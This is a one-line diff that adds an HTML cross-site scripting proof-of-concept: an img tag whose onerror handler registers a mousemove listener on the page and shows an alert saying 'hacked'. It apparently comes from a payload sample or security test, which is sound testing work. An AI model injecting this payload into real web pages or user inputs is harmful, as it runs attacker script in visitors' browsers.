@@ -1,0 +1,1 @@
+<img src="x" onerror="document.body.addEventListener('mousemove', function() {alert('hacked');});">
